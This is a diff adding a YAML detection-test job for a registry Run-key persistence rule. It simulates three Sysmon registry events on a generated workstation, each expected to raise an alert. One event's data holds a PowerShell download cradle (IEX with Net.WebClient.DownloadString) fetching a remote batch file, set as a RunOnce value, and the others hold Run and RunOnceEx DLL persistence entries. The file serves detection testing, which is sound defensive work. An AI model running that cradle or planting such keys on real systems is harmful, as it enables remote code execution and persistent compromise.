@@ -1,0 +1,61 @@
+type: job
+name: Registry Keys Used For Persistence
+detection:
+  source: escu
+  name: "ESCU - Registry Keys Used For Persistence - Rule"
+  id: f5f6af30-7aa7-4295-bfe9-07fe87c01a4b
+description: |
+  Registry Run-key autostart persistence (T1547.001) on one workstation:
+  reg.exe adds a per-user HKU Run value and a machine-wide RunOnceEx
+  dependency DLL, and powershell.exe plants a RunOnce value that runs a
+  download cradle at next logon.
+
+mitre:
+  tactics: [persistence, privilege-escalation]
+  techniques: [T1547.001]
+
+state:
+  domain_short:       CORP
+  domain_tld:         local
+  domain_short_lower: fn.lower(ref.domain_short)
+  domain_fqdn:        "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:           gen.hostname(class=windows-workstation, domain=ref.domain_fqdn)
+
+workloads:
+  # Per-user Run value pointing at an executable, written by reg.exe.
+  - scenario: scenarios/windows/sysmon/registry/run-key-persistence-value-set
+    bindings:
+      computer: ref.computer
+    expectation:
+      expected: alert
+      summary: "reg.exe adds a value under HKU\\<SID>\\...\\CurrentVersion\\Run that launches an executable at logon"
+      mitre:
+        tactics: [persistence, privilege-escalation]
+        techniques: [T1547.001]
+
+  # Machine-wide RunOnceEx dependency entry loading a DLL, written by reg.exe.
+  - scenario: scenarios/windows/sysmon/registry/run-key-persistence-value-set
+    bindings:
+      computer:      ref.computer
+      target_object: "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend\\1"
+      details:       "C:\\Path\\AtomicRedTeam.dll"
+    expectation:
+      expected: alert
+      summary: "reg.exe adds a RunOnceEx Depend entry under HKLM that loads a DLL at next logon"
+      mitre:
+        tactics: [persistence, privilege-escalation]
+        techniques: [T1547.001]
+
+  # Machine-wide RunOnce value running a PowerShell download cradle.
+  - scenario: scenarios/windows/sysmon/registry/run-key-persistence-value-set
+    bindings:
+      computer:      ref.computer
+      image:         "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      target_object: "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\NextRun"
+      details:       'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
+    expectation:
+      expected: alert
+      summary: "powershell.exe sets HKLM RunOnce NextRun to a PowerShell download cradle"
+      mitre:
+        tactics: [persistence, privilege-escalation]
+        techniques: [T1547.001]
